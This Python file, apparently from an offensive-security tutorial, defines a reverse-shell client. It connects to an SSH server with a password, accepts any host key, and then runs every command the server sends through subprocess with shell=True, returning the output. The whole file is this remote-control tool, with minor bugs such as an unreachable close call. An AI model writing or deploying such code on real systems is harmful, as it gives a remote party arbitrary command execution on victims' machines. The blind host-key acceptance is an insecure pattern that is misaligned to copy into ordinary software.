import threading
import paramiko
import subprocess

def ssh_command(ip,user,passwd,command):
    client=paramiko.SSHClient()
    #client.load_host_key_policy(paramiko.AutoAddPolicy())
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip,username=user,password=passwd)
    ssh_session=client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024))
        while True:
            command=ssh_session.recv(1024)
            try:
                cmd_output=subprocess.check_output(command,shell=True)#client execute command and sends back result to the server
                ssh_session.send(cmd_output)
            except Exception:
                ssh_session.send(str(Exception))
        client.close()
    return
    